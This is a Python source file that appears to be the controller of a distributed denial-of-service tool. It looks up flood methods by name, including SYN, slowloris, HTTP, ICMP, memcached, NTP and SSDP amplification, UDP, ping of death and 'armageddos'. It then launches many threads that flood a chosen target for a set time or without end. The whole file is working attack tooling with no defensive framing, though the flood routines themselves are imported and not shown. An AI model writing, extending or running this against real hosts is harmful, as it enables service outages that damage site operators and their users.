# Import modules
import sys
from time import time, sleep
from threading import Thread
from rich.console import Console
from bin.crash import CriticalError
from bin.addons.banner import banner
from bin.addons.banner import methods_help
from humanfriendly import format_timespan
from bin.addons.ip_tools import GetTargetAddress, InternetConnectionCheck
from rich.progress import track

# Define styled print
print = Console().print

purple = "blue_violet"
red = "red3"
green = "green1"
pink = "magenta3"
light_blue = "dark_slate_gray2"
yellow = "yellow1"


def GetMethodByName(method):
    methods = [
        "syn",
        "slowloris",
        "http",
        "slowloris",
        "icmp",
        "memcached",
        "ntp",
        "udp",
        "ssdp",
        "armageddos",
    ]

    if method == "POD":
        dir = "bin.attacks.ping_of_death"
    elif method in methods:
        dir = f"bin.attacks.{method}"
    else:
        print(
            f"[{red} bold][✘] ERROR'[/{red} bold] "
            + f"[{yellow}]Unknown ddos method "
            + f"[{red}]{repr(method)}[/{red}] "
            + f"selected.[/{yellow}]"
        )
        methods_help()
        sys.exit(1)

    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(
            f"Method 'flood' not found in {repr(dir)}. Please use python 3.8", "-"
        )


""" Class to control attack methods """


class AttackMethod:
    # Constructor
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    # Enter
    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    # Exit
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(
            f"[{green} bold][✔] SUCCESS[/{green} bold] "
            + f"[{purple}]Attack completed![/{purple}]"
        )

    # Run time checker
    def __RunTimer(self):
        __stopTime = time() + self.duration
        if self.duration != 0:
            while time() < __stopTime:
                if not self.is_running:
                    return
                sleep(1)
        else:
            while True:
                if not self.is_running:
                    return
                sleep(1)
        self.is_running = False

    # Run flooder
    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    # Start threads
    def __RunThreads(self) -> None:
        """
        Start and run Threads
        """
        thread = Thread(target=self.__RunTimer)
        thread.start()

        # Create flood threads
        for _ in track(
            range(self.threads_count),
            description=f"[{pink}]Creating {self.threads_count} threads...",
        ):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)

        # Start flood threads
        for thread in track(
            self.threads,
            description=f"[{pink}]Starting {self.threads_count} threads",
        ):
            thread.start()

        # Wait flood threads for stop
        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"[{pink}][?][/{pink}] [{yellow}]Stopped thread {index + 1}[/{yellow}]"
            )

    # Start ddos attack
    def Start(self):
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)

        never = (
            f"[{red}]" + "N"
            f"[{yellow}]" + "E"
            f"[{green}]" + "V"
            f"[{purple}]" + "E"
            f"[{pink}]" + "R"
        )

        if self.duration != 0:
            print(
                f"[{pink} bold][?][/{pink} bold] "
                + f"[{light_blue}]Starting attack to[/{light_blue}] "
                + f"[{yellow}]{target} [{light_blue}]using method[/{light_blue}] "
                + f"{self.name}[/{yellow}].\n"
                ""
                f"[{pink} bold][?][/{pink} bold] "
                + f"[{light_blue}]Attack will be stopped after[/{light_blue}] [{pink}]{duration}[/{pink}]."
            )
        else:
            print(
                f"[{pink} bold][?][/{pink} bold] "
                + f"[{light_blue}]Starting attack to[/{light_blue}] [{yellow}]{target}[/{yellow}] "
                + f"[{light_blue}]using method[/{light_blue}] [{yellow}]{self.name}[/{yellow}].\n"
                f"[{pink} bold][?][/{pink} bold] "
                + f"[{light_blue}]Attack will be stopped after...[/{light_blue}] [b]{never}[/b]"
            )

        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n[{red}][✘] ERROR[/{red}] "
                + f"[{yellow}]Ctrl+C detected. Stopping {self.threads_count} threads...[/{yellow}]"
            )
            print(f"[{yellow}]Please, wait for all threads stop[/{yellow}]")
            # Wait all threads for stop
            for thread in self.threads:
                thread.join()
            banner()
        except Exception as err:
            print(err)
            sleep(1.5)
            from bin.addons.clean import clear

            clear()
            banner()
